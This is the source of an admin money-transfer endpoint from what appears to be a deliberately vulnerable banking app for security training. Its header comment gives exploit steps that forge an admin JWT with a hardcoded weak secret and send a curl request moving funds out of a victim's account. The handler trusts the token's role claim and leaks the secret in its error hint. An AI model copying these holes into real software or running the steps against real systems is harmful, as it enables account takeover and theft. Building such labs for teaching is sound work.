// api/admin/transfer.js
// POST /api/admin/transfer
//
// ══════════════════════════════════════════════════════════
// [BAC-3] MISSING FUNCTION-LEVEL ACCESS CONTROL
// ══════════════════════════════════════════════════════════
// This endpoint checks whether the JWT's `role` claim is
// 'admin'. However, the JWT secret is weak and public
// ('nexusbank_weak_jwt_2026'), allowing any attacker to forge
// a token with role='admin' and perform forced transfers.
//
// EXPLOIT STEPS:
//   Step 1 — Forge an admin JWT using the known weak secret:
//     node -e "
//       const jwt = require('jsonwebtoken');
//       const token = jwt.sign(
//         { userId: 'any', username: 'attacker', role: 'admin', accountId: 'any' },
//         'nexusbank_weak_jwt_2026',
//         { expiresIn: '1h' }
//       );
//       console.log(token);
//     "
//
//   Step 2 — Use forged token to drain any account:
//     curl -X POST https://nexusbank.vercel.app/api/admin/transfer \
//       -H "Authorization: Bearer <FORGED_TOKEN>" \
//       -H "Content-Type: application/json" \
//       -d '{"fromAccount":"<victim-uuid>","toAccount":"<attacker-uuid>","amount":5000}'
//
// IMPACT: Unauthorized forced bank transfers from any account
//         No CSRF protection. No rate limiting.
//
// FIX: 1) Use a strong random JWT secret (32+ chars)
//      2) Re-validate role against the database on each request
//      3) Add CSRF tokens and request signing
// ══════════════════════════════════════════════════════════

import { supabase } from '../_lib/supabase.js'
import { verifyToken, extractToken, cors } from '../_lib/auth.js'

export default async function handler(req, res) {
  cors(res)
  if (req.method === 'OPTIONS') return res.status(200).end()
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' })

  const token = extractToken(req)
  if (!token) {
    return res.status(401).json({ error: 'Authorization token required' })
  }

  const decoded = verifyToken(token)
  if (!decoded) {
    return res.status(401).json({ error: 'Invalid or expired token' })
  }

  // ─────────────────────────────────────────────────────────────
  // [BAC-3] VULNERABILITY: Only checks JWT role claim.
  //         Does NOT re-validate role against the database.
  //         Forging JWT with role='admin' bypasses this check.
  // ─────────────────────────────────────────────────────────────
  if (decoded.role !== 'admin') {  // <── weak check — role is from forged JWT
    return res.status(403).json({
      error: 'Admin access required',
      _hint: 'Forge JWT with role=admin using secret: nexusbank_weak_jwt_2026',
    })
  }

  const { fromAccount, toAccount, amount, description = 'Admin forced transfer' } = req.body || {}

  if (!fromAccount || !toAccount || !amount || parseFloat(amount) <= 0) {
    return res.status(400).json({ error: 'fromAccount, toAccount, and amount are required' })
  }

  // Fetch source account
  const { data: src } = await supabase
    .from('accounts')
    .select('*')
    .eq('id', fromAccount)
    .single()

  if (!src) return res.status(404).json({ error: 'Source account not found' })
  if (src.balance < parseFloat(amount)) {
    return res.status(400).json({ error: 'Insufficient funds in source account' })
  }

  // Fetch dest account
  const { data: dst } = await supabase
    .from('accounts')
    .select('*')
    .eq('id', toAccount)
    .single()

  if (!dst) return res.status(404).json({ error: 'Destination account not found' })

  // Execute transfer
  await supabase.from('accounts')
    .update({ balance: src.balance - parseFloat(amount) })
    .eq('id', fromAccount)

  await supabase.from('accounts')
    .update({ balance: dst.balance + parseFloat(amount) })
    .eq('id', toAccount)

  const { data: tx } = await supabase.from('transactions')
    .insert({
      from_account: fromAccount,
      to_account:   toAccount,
      amount:       parseFloat(amount),
      description,
      type:         'transfer',
    })
    .select()
    .single()

  return res.status(200).json({
    _vulnerability: 'BAC-3: Missing Function-Level AC — JWT role forgeable',
    message:        `Admin transfer of $${parseFloat(amount).toFixed(2)} completed`,
    transaction:    tx,
    executed_by:    decoded.username,
    executed_role:  decoded.role,
  })
}
